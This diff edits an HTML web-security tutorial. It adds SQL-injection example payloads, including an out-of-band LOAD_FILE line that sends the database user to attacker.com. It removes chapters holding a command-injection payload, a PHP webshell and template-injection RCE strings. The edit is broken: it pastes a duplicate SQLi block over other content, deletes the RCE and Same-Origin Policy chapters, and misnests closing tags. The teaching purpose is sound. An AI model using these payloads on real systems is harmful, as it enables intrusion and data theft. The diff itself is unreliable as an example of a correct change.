@@ -2277,53 +2277,272 @@
                         <section class="content-section">
                             <h2 id="sqli-types-reference">
                                 <i class="fas fa-table"></i>
-                                SQL Injection Types Reference Table
+                                SQL Injection Types Reference
                             </h2>
                             
                             <div class="content-block">
-                                <div class="sqli-reference-table">
-                                    <table class="vulnerability-table">
-                                        <thead>
-                                            <tr>
-                                                <th>SQL Injection Type</th>
-                                                <th>Description</th>
-                                            </tr>
-                                        </thead>
-                                        <tbody>
-                                            <tr>
-                                                <td><strong>In-band SQLi (Classic SQLi)</strong></td>
-                                                <td>In-band SQL Injection is the most common and easy-to-exploit of SQL Injection attacks. In-band SQL Injection occurs when an attacker is able to use the same communication channel to both launch the attack and gather results. The two most common types of in-band SQL Injection are Error-based SQLi and Union-based SQLi.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Error-based SQLi</strong></td>
-                                                <td>Error-based SQL is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database. In some cases, error-based SQL injection alone is enough for an attacker to enumerate an entire database.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Union-based SQLi</strong></td>
-                                                <td>Union-based SQLi is an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Inferential SQLi (Blind SQLi)</strong></td>
-                                                <td>Inferential SQL Injection, unlike in-band SQLi, may take longer for an attacker to exploit; however, it is just as dangerous as any other form of SQL Injection. In an inferential SQLi attack, no data is actually transferred via the web application and the attacker would not be able to see the result of an attack in-band (which is why such attacks are commonly referred to as "blind SQL injection attacks"). Instead, an attacker is able to reconstruct the database structure by sending payloads, observing the web application's response and the resulting behavior of the database server. The two types of inferential SQL Injection are Blind-boolean-based SQLi and Blind-time-based SQLi.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Boolean-based (content-based) Blind SQLi</strong></td>
-                                                <td>Boolean-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the application to return a different result depending on whether the query returns a TRUE or FALSE result. Depending on the result, the content within the HTTP response will change, or remain the same. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Time-based Blind SQLi</strong></td>
-                                                <td>Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time (in seconds) before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Depending on the result, an HTTP response will be returned with a delay, or returned immediately. This allows an attacker to infer if the payload used returned true or false, even though no data from the database is returned.</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Out-of-band SQLi</strong></td>
-                                                <td>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).</td>
-                                            </tr>
-                                            <tr>
-                                                <td><strong>Voice Based Sql Injection</strong></td>
-                                                <td>It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound.</td>
-                                            </tr>
-                                        </tbody>
-                                    </table>
+                                <div class="sqli-types-detailed">
+                                    
+                                    <!-- In-band SQLi -->
+                                    <div class="sqli-type-detailed in-band">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-exchange-alt"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>In-band SQLi (Classic SQLi)</h3>
+                                                <span class="difficulty-badge easy">Easy to Exploit</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> The most common SQL injection attack where the attacker uses the same communication channel to both launch the attack and gather results.</p>
+                                            <div class="key-points">
+                                                <h4>Key Characteristics:</h4>
+                                                <ul>
+                                                    <li>Direct feedback from database</li>
+                                                    <li>Results visible in application response</li>
+                                                    <li>Fast data extraction</li>
+                                                </ul>
+                                            </div>
+                                            <div class="sub-types">
+                                                <strong>Sub-types:</strong> Error-based SQLi, Union-based SQLi
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Error-based SQLi -->
+                                    <div class="sqli-type-detailed error-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Error-based SQLi</h3>
+                                                <span class="difficulty-badge easy">Easy</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Relies on error messages thrown by the database server to obtain information about the database structure.</p>
+                                            <div class="key-points">
+                                                <h4>How it Works:</h4>
+                                                <ul>
+                                                    <li>Triggers intentional database errors</li>
+                                                    <li>Extracts data from error messages</li>
+                                                    <li>Sometimes enough to enumerate entire database</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Union-based SQLi -->
+                                    <div class="sqli-type-detailed union-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-link"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Union-based SQLi</h3>
+                                                <span class="difficulty-badge medium">Medium</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Uses the UNION SQL operator to combine results from injected query with original query, returned as part of HTTP response.</p>
+                                            <div class="key-points">
+                                                <h4>Requirements:</h4>
+                                                <ul>
+                                                    <li>Same number of columns in both queries</li>
+                                                    <li>Compatible data types</li>
+                                                    <li>Application displays query results</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' UNION SELECT null,username,password FROM users--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Inferential SQLi -->
+                                    <div class="sqli-type-detailed inferential">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-eye-slash"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Inferential SQLi (Blind SQLi)</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> No data is directly transferred; attacker reconstructs database structure by observing application behavior and database server responses.</p>
+                                            <div class="key-points">
+                                                <h4>Characteristics:</h4>
+                                                <ul>
+                                                    <li>No visible data in response</li>
+                                                    <li>Slower exploitation process</li>
+                                                    <li>Requires patient, methodical approach</li>
+                                                    <li>Just as dangerous as in-band attacks</li>
+                                                </ul>
+                                            </div>
+                                            <div class="sub-types">
+                                                <strong>Sub-types:</strong> Boolean-based, Time-based
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Boolean-based SQLi -->
+                                    <div class="sqli-type-detailed boolean-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-question-circle"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Boolean-based Blind SQLi</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Forces the application to return different results based on whether the SQL query returns TRUE or FALSE.</p>
+                                            <div class="key-points">
+                                                <h4>Method:</h4>
+                                                <ul>
+                                                    <li>Send queries that return true/false</li>
+                                                    <li>Observe differences in HTTP response</li>
+                                                    <li>Infer data character by character</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Time-based SQLi -->
+                                    <div class="sqli-type-detailed time-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-clock"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Time-based Blind SQLi</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Forces the database to wait a specified amount of time before responding, using response time to infer TRUE/FALSE results.</p>
+                                            <div class="key-points">
+                                                <h4>Database Functions:</h4>
+                                                <ul>
+                                                    <li><strong>MySQL:</strong> SLEEP(5)</li>
+                                                    <li><strong>SQL Server:</strong> WAITFOR DELAY '00:00:05'</li>
+                                                    <li><strong>PostgreSQL:</strong> pg_sleep(5)</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0)--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Out-of-band SQLi -->
+                                    <div class="sqli-type-detailed out-of-band">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-satellite-dish"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Out-of-band SQLi</h3>
+                                                <span class="difficulty-badge expert">Expert</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Uses a different communication channel to launch the attack and gather results when the same channel cannot be used.</p>
+                                            <div class="key-points">
+                                                <h4>Requirements:</h4>
+                                                <ul>
+                                                    <li>Database server features must be enabled</li>
+                                                    <li>Alternative communication channels (DNS, HTTP)</li>
+                                                    <li>Useful when server responses are unstable</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example (DNS):</strong>
+                                                <code>' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\test.txt')))--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Voice-based SQLi -->
+                                    <div class="sqli-type-detailed voice-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-microphone"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Voice-based SQLi</h3>
+                                                <span class="difficulty-badge rare">Rare</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> SQL injection attack applied through voice commands in applications that provide database access via voice interfaces.</p>
+                                            <div class="key-points">
+                                                <h4>Target Applications:</h4>
+                                                <ul>
+                                                    <li>Voice-controlled database applications</li>
+                                                    <li>Smart assistants with database integration</li>
+                                                    <li>Voice-to-text input systems</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Spoken Example:</strong>
+                                                <code>"Search for user admin quote semicolon drop table users semicolon comment"</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <!-- Quick Reference Summary -->
+                                <div class="sqli-summary-table">
+                                    <h3>Quick Reference Summary</h3>
+                                    <div class="summary-grid">
+                                        <div class="summary-item">
+                                            <div class="summary-type">In-band</div>
+                                            <div class="summary-desc">Direct results visible</div>
+                                            <div class="summary-difficulty easy">Easy</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Error-based</div>
+                                            <div class="summary-desc">Uses error messages</div>
+                                            <div class="summary-difficulty easy">Easy</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Union-based</div>
+                                            <div class="summary-desc">Combines query results</div>
+                                            <div class="summary-difficulty medium">Medium</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Boolean Blind</div>
+                                            <div class="summary-desc">True/false responses</div>
+                                            <div class="summary-difficulty hard">Hard</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Time-based</div>
+                                            <div class="summary-desc">Uses response delays</div>
+                                            <div class="summary-difficulty hard">Hard</div>
+                                        </div>
+                                        <div class="summary-item">
+                                            <div class="summary-type">Out-of-band</div>
+                                            <div class="summary-desc">Different channels</div>
+                                            <div class="summary-difficulty expert">Expert</div>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
                         </section>
@@ -2743,10 +2962,10 @@
                                                 <li>Exhaust system resources</li>
                                                 <li>Escalate privileges</li>
                                                 <li>Corrupt application state</li>
-                                            </ul>
+                                                </ul>
+                                            </div>
+                                            </div>
                                         </div>
-                                    </div>
-                                </div>
 
                                 <div class="poc-template">
                                     <h4>Race Condition Attack Vector</h4>
@@ -2775,8 +2994,8 @@ To: attacker
                                 Next Chapter
                                 <i class="fas fa-chevron-right"></i>
                             </button>
-                        </div>
-                    </div>
+                                            </div>
+                                            </div>
                 </article>
 
                 <!-- Chapter 13: Server-Side Request Forgery -->
@@ -2785,7 +3004,7 @@ To: attacker
                         <div class="chapter-meta">
                             <span class="chapter-number">Chapter 13</span>
                             <span class="part-info">Part III: Web Vulnerabilities</span>
-                        </div>
+                                        </div>
                         <h1 class="chapter-title">Server-Side Request Forgery (SSRF)</h1>
                         <div class="chapter-description">
                             Learn about SSRF attacks where attackers can make requests from the server to internal or external systems.
@@ -2823,10 +3042,10 @@ To: attacker
                                                 <li>Access admin interfaces</li>
                                                 <li>Retrieve sensitive files</li>
                                                 <li>Bypass firewalls and network controls</li>
-                                            </ul>
+                                                </ul>
+                                            </div>
+                                            </div>
                                         </div>
-                                    </div>
-                                </div>
 
                                 <div class="poc-template">
                                     <h4>Common SSRF Payloads</h4>
@@ -2851,8 +3070,8 @@ http://169.254.169.254/metadata/instance
                                 Next Chapter
                                 <i class="fas fa-chevron-right"></i>
                             </button>
-                        </div>
-                    </div>
+                                            </div>
+                                            </div>
                 </article>
 
                 <!-- Chapter 14: Insecure Deserialization -->
@@ -2861,7 +3080,7 @@ http://169.254.169.254/metadata/instance
                         <div class="chapter-meta">
                             <span class="chapter-number">Chapter 14</span>
                             <span class="part-info">Part III: Web Vulnerabilities</span>
-                        </div>
+                                        </div>
                         <h1 class="chapter-title">Insecure Deserialization</h1>
                         <div class="chapter-description">
                             Understand deserialization vulnerabilities that can lead to remote code execution when untrusted data is deserialized.
@@ -2899,8 +3118,8 @@ http://169.254.169.254/metadata/instance
                                                 <li>Access sensitive files and databases</li>
                                                 <li>Pivot to internal networks</li>
                                                 <li>Perform denial of service attacks</li>
-                                            </ul>
-                                        </div>
+                                                </ul>
+                                            </div>
                                     </div>
                                 </div>
                             </div>
@@ -3030,8 +3249,8 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
 
                                     <div class="xxe-type-card blind">
                                         <div class="xxe-icon">
-                                            <i class="fas fa-eye-slash"></i>
-                                        </div>
+                                                <i class="fas fa-eye-slash"></i>
+                                            </div>
                                         <h4>Blind XXE</h4>
                                         <p>XML is processed but content is not returned, requiring out-of-band techniques</p>
                                         <div class="attack-details">
@@ -3060,18 +3279,18 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
                                                 <li>Exploits verbose error messages</li>
                                                 <li>Combines file reading with deliberate errors</li>
                                                 <li>Useful when direct response is not available</li>
-                                            </ul>
+                                                </ul>
                                             <div class="payload-example">
                                                 <strong>Example:</strong>
                                                 <code>&lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;&lt;!ENTITY xxe "&f;"&gt;</code>
                                             </div>
+                                            </div>
                                         </div>
-                                    </div>
 
                                     <div class="xxe-type-card dos">
                                         <div class="xxe-icon">
                                             <i class="fas fa-bomb"></i>
-                                        </div>
+                                    </div>
                                         <h4>XXE DoS (Billion Laughs)</h4>
                                         <p>Exponential entity expansion that consumes server resources causing denial of service</p>
                                         <div class="attack-details">
@@ -3114,8 +3333,8 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
                                                         <code>/proc/self/environ</code>
                                                         <code>/var/log/apache2/access.log</code>
                                                         <code>~/.ssh/id_rsa</code>
-                                                    </div>
-                                                </div>
+                                            </div>
+                                            </div>
                                                 <div class="file-category">
                                                     <h6>Windows</h6>
                                                     <div class="file-list">
@@ -3123,7 +3342,7 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
                                                         <code>C:\boot.ini</code>
                                                         <code>C:\windows\win.ini</code>
                                                         <code>C:\windows\system32\config\sam</code>
-                                                    </div>
+                                        </div>
                                                 </div>
                                             </div>
                                         </div>
@@ -4351,316 +4570,271 @@ user=victim&user=attacker&amount=1000
                                     </div>
                                 </div>
 
-                                <div class="logic-tools">
-                                    <h4>Logic Error Testing Tools</h4>
-                                    <div class="tools-showcase">
-                                        <div class="tool-item">
-                                            <div class="tool-icon">
+                                <div class="sqli-types-detailed">
+                                    
+                                    <!-- In-band SQLi -->
+                                    <div class="sqli-type-detailed in-band">
+                                        <div class="type-header">
+                                            <div class="type-icon">
                                                 <i class="fas fa-exchange-alt"></i>
                                             </div>
-                                            <h5>Burp Suite</h5>
-                                            <p>Manual testing with parameter manipulation and session handling</p>
-                                            <div class="tool-features">
-                                                <span class="tool-feature">Intruder fuzzing</span>
-                                                <span class="tool-feature">Parameter analysis</span>
-                                                <span class="tool-feature">Session tracking</span>
-                                                <span class="tool-feature">Repeater testing</span>
+                                            <div class="type-title">
+                                                <h3>In-band SQLi (Classic SQLi)</h3>
+                                                <span class="difficulty-badge easy">Easy to Exploit</span>
                                             </div>
                                         </div>
-                                        
-                                        <div class="tool-item">
-                                            <div class="tool-icon">
-                                                <i class="fas fa-user-friends"></i>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> The most common SQL injection attack where the attacker uses the same communication channel to both launch the attack and gather results.</p>
+                                            <div class="key-points">
+                                                <h4>Key Characteristics:</h4>
+                                                <ul>
+                                                    <li>Direct feedback from database</li>
+                                                    <li>Results visible in application response</li>
+                                                    <li>Fast data extraction</li>
+                                                </ul>
                                             </div>
-                                            <h5>Multi-User Testing</h5>
-                                            <p>Testing with different user roles and privilege levels</p>
-                                            <div class="tool-commands">
-                                                <code>User A: Regular user account</code>
-                                                <code>User B: Admin user account</code>
-                                                <code>User C: Guest/anonymous user</code>
-                                                <code>Cross-user testing scenarios</code>
-                                            </div>
-                                        </div>
-                                        
-                                        <div class="tool-item">
-                                            <div class="tool-icon">
-                                                <i class="fas fa-code"></i>
-                                            </div>
-                                            <h5>Custom Scripts</h5>
-                                            <p>Automated testing for race conditions and business logic</p>
-                                            <div class="script-examples">
-                                                <h6>Race Condition Script:</h6>
-                                                <code>
-# Parallel requests
-import threading
-import requests
-
-def make_request():
-    requests.post('/transfer', 
-                  json={'amount': 100})
-
-threads = []
-for i in range(10):
-    t = threading.Thread(target=make_request)
-    threads.append(t)
-    t.start()
-                                                </code>
+                                            <div class="sub-types">
+                                                <strong>Sub-types:</strong> Error-based SQLi, Union-based SQLi
                                             </div>
                                         </div>
                                     </div>
-                                </div>
-                            </div>
-                        </section>
 
-                        <!-- Navigation Footer -->
-                        <div class="chapter-navigation">
-                            <button class="nav-btn prev-btn" onclick="showChapter('chapter16')">
-                                <i class="fas fa-chevron-left"></i>
-                                Previous Chapter
-                            </button>
-                            <button class="nav-btn next-btn" onclick="showChapter('chapter18')">
-                                Next Chapter
-                                <i class="fas fa-chevron-right"></i>
-                            </button>
-                        </div>
-                    </div>
-                </article>
-
-                <!-- Chapter 18: Remote Code Execution -->
-                <article id="chapter18" class="chapter">
-                    <header class="chapter-header">
-                        <div class="chapter-meta">
-                            <span class="chapter-number">Chapter 18</span>
-                            <span class="part-info">Part III: Web Vulnerabilities</span>
-                        </div>
-                        <h1 class="chapter-title">Remote Code Execution</h1>
-                        <div class="chapter-description">
-                            Master remote code execution vulnerabilities that allow arbitrary command execution on target systems.
-                        </div>
-                    </header>
-
-                    <div class="chapter-content">
-                        <section class="content-section">
-                            <h2 id="rce-overview">
-                                <i class="fas fa-terminal"></i>
-                                Understanding Remote Code Execution
-                            </h2>
-                            
-                            <div class="content-block">
-                                <p class="lead">
-                                    Remote Code Execution (RCE) vulnerabilities allow attackers to execute arbitrary commands or code on a target system, representing one of the most severe security vulnerabilities possible.
-                                </p>
-
-                                <div class="vulnerability-impact">
-                                    <h4>Impact & Severity</h4>
-                                    <div class="impact-grid">
-                                        <div class="impact-card critical">
-                                            <div class="severity-icon">
-                                                <i class="fas fa-skull-crossbones"></i>
-                                            </div>
-                                            <h5>Critical Severity</h5>
-                                            <p>Complete system compromise and unlimited access to target infrastructure</p>
-                                        </div>
-                                        <div class="impact-details">
-                                            <h5>What attackers can achieve:</h5>
-                                            <ul>
-                                                <li>Execute any system commands</li>
-                                                <li>Install malware and backdoors</li>
-                                                <li>Access sensitive files and databases</li>
-                                                <li>Pivot to internal networks</li>
-                                                <li>Establish persistent access</li>
-                                                <li>Complete data exfiltration</li>
-                                            </ul>
-                                        </div>
-                                    </div>
-                                </div>
-
-                                <div class="rce-types-grid">
-                                    <div class="rce-type-card command">
-                                        <div class="rce-icon">
-                                            <i class="fas fa-terminal"></i>
-                                        </div>
-                                        <h4>Command Injection</h4>
-                                        <p>Injection of OS commands into vulnerable application parameters</p>
-                                        <div class="example-code">
-                                            <code>
-# Vulnerable PHP code
-system("ping -c 4 " . $_GET['host']);
-
-# Attack payload
-?host=8.8.8.8; cat /etc/passwd
-                                            </code>
-                                        </div>
-                                    </div>
-
-                                    <div class="rce-type-card upload">
-                                        <div class="rce-icon">
-                                            <i class="fas fa-upload"></i>
-                                        </div>
-                                        <h4>File Upload RCE</h4>
-                                        <p>Uploading malicious executable files to achieve code execution</p>
-                                        <div class="example-code">
-                                            <code>
-# PHP webshell upload
-&lt;?php system($_GET['cmd']); ?&gt;
-
-# Access via:
-/uploads/shell.php?cmd=whoami
-                                            </code>
-                                        </div>
-                                    </div>
-
-                                    <div class="rce-type-card deserialization">
-                                        <div class="rce-icon">
-                                            <i class="fas fa-boxes"></i>
-                                        </div>
-                                        <h4>Deserialization RCE</h4>
-                                        <p>Exploiting unsafe deserialization to execute arbitrary code</p>
-                                        <div class="example-code">
-                                            <code>
-# Java deserialization
-ObjectInputStream.readObject(malicious_payload)
-
-# Python pickle injection
-pickle.loads(crafted_payload)
-                                            </code>
-                                        </div>
-                                    </div>
-
-                                    <div class="rce-type-card template">
-                                        <div class="rce-icon">
-                                            <i class="fas fa-code"></i>
-                                        </div>
-                                        <h4>Template Injection RCE</h4>
-                                        <p>Server-side template injection leading to code execution</p>
-                                        <div class="example-code">
-                                            <code>
-# Jinja2 RCE
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-
-# Twig RCE
-{{_self.env.registerUndefinedFilterCallback("exec")}}
-                                            </code>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </section>
-
-                        <!-- Navigation Footer -->
-                        <div class="chapter-navigation">
-                            <button class="nav-btn prev-btn" onclick="showChapter('chapter17')">
-                                <i class="fas fa-chevron-left"></i>
-                                Previous Chapter
-                            </button>
-                            <button class="nav-btn next-btn" onclick="showChapter('chapter19')">
-                                Next Chapter
-                                <i class="fas fa-chevron-right"></i>
-                            </button>
-                        </div>
-                    </div>
-                </article>
-
-                <!-- Chapter 19: Same-Origin Policy Vulnerabilities -->
-                <article id="chapter19" class="chapter">
-                    <header class="chapter-header">
-                        <div class="chapter-meta">
-                            <span class="chapter-number">Chapter 19</span>
-                            <span class="part-info">Part III: Web Vulnerabilities</span>
-                        </div>
-                        <h1 class="chapter-title">Same-Origin Policy Vulnerabilities</h1>
-                        <div class="chapter-description">
-                            Explore same-origin policy bypasses and cross-origin attacks that compromise browser security models.
-                        </div>
-                    </header>
-
-                    <div class="chapter-content">
-                        <section class="content-section">
-                            <h2 id="sop-overview">
-                                <i class="fas fa-lock"></i>
-                                Understanding Same-Origin Policy
-                            </h2>
-                            
-                            <div class="content-block">
-                                <p class="lead">
-                                    Same-Origin Policy (SOP) is a critical browser security mechanism that restricts how scripts from one origin can access resources from another origin. Bypasses can lead to serious security breaches.
-                                </p>
-
-                                <div class="vulnerability-impact">
-                                    <h4>Impact & Severity</h4>
-                                    <div class="impact-grid">
-                                        <div class="impact-card high">
-                                            <div class="severity-icon">
+                                    <!-- Error-based SQLi -->
+                                    <div class="sqli-type-detailed error-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
                                                 <i class="fas fa-exclamation-triangle"></i>
                                             </div>
-                                            <h5>High Severity</h5>
-                                            <p>Cross-origin data access and browser security model bypasses</p>
+                                            <div class="type-title">
+                                                <h3>Error-based SQLi</h3>
+                                                <span class="difficulty-badge easy">Easy</span>
+                                            </div>
                                         </div>
-                                        <div class="impact-details">
-                                            <h5>What attackers can achieve:</h5>
-                                            <ul>
-                                                <li>Access cross-origin data</li>
-                                                <li>Bypass CORS restrictions</li>
-                                                <li>Read sensitive information</li>
-                                                <li>Perform cross-site attacks</li>
-                                                <li>Extract authentication tokens</li>
-                                                <li>Access internal resources</li>
-                                            </ul>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Relies on error messages thrown by the database server to obtain information about the database structure.</p>
+                                            <div class="key-points">
+                                                <h4>How it Works:</h4>
+                                                <ul>
+                                                    <li>Triggers intentional database errors</li>
+                                                    <li>Extracts data from error messages</li>
+                                                    <li>Sometimes enough to enumerate entire database</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--</code>
+                                            </div>
                                         </div>
                                     </div>
+
+                                    <!-- Union-based SQLi -->
+                                    <div class="sqli-type-detailed union-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-link"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Union-based SQLi</h3>
+                                                <span class="difficulty-badge medium">Medium</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Uses the UNION SQL operator to combine results from injected query with original query, returned as part of HTTP response.</p>
+                                            <div class="key-points">
+                                                <h4>Requirements:</h4>
+                                                <ul>
+                                                    <li>Same number of columns in both queries</li>
+                                                    <li>Compatible data types</li>
+                                                    <li>Application displays query results</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' UNION SELECT null,username,password FROM users--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Inferential SQLi -->
+                                    <div class="sqli-type-detailed inferential">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-eye-slash"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Inferential SQLi (Blind SQLi)</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> No data is directly transferred; attacker reconstructs database structure by observing application behavior and database server responses.</p>
+                                            <div class="key-points">
+                                                <h4>Characteristics:</h4>
+                                                <ul>
+                                                    <li>No visible data in response</li>
+                                                    <li>Slower exploitation process</li>
+                                                    <li>Requires patient, methodical approach</li>
+                                                    <li>Just as dangerous as in-band attacks</li>
+                                                </ul>
+                                            </div>
+                                            <div class="sub-types">
+                                                <strong>Sub-types:</strong> Boolean-based, Time-based
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Boolean-based SQLi -->
+                                    <div class="sqli-type-detailed boolean-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-question-circle"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Boolean-based Blind SQLi</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Forces the application to return different results based on whether the SQL query returns TRUE or FALSE.</p>
+                                            <div class="key-points">
+                                                <h4>Method:</h4>
+                                                <ul>
+                                                    <li>Send queries that return true/false</li>
+                                                    <li>Observe differences in HTTP response</li>
+                                                    <li>Infer data character by character</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Time-based SQLi -->
+                                    <div class="sqli-type-detailed time-based">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-clock"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Time-based Blind SQLi</h3>
+                                                <span class="difficulty-badge hard">Hard</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Forces the database to wait a specified amount of time before responding, using response time to infer TRUE/FALSE results.</p>
+                                            <div class="key-points">
+                                                <h4>Database Functions:</h4>
+                                                <ul>
+                                                    <li><strong>MySQL:</strong> SLEEP(5)</li>
+                                                    <li><strong>SQL Server:</strong> WAITFOR DELAY '00:00:05'</li>
+                                                    <li><strong>PostgreSQL:</strong> pg_sleep(5)</li>
+                                                </ul>
+                                            </div>
+                                            <div class="example-payload">
+                                                <strong>Example:</strong>
+                                                <code>' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),0)--</code>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Out-of-band SQLi -->
+                                    <div class="sqli-type-detailed out-of-band">
+                                        <div class="type-header">
+                                            <div class="type-icon">
+                                                <i class="fas fa-satellite-dish"></i>
+                                            </div>
+                                            <div class="type-title">
+                                                <h3>Out-of-band SQLi</h3>
+                                                <span class="difficulty-badge expert">Expert</span>
+                                            </div>
+                                        </div>
+                                        <div class="type-content">
+                                            <p><strong>Definition:</strong> Uses a different communication channel to launch the attack and gather results when the same channel cannot be used.</p>
+                                            <div class="key-points">
+                                                <h4>Requirements:</h4>
+                                                <ul>
+                                                    <li>Database server features must be enabled</li>
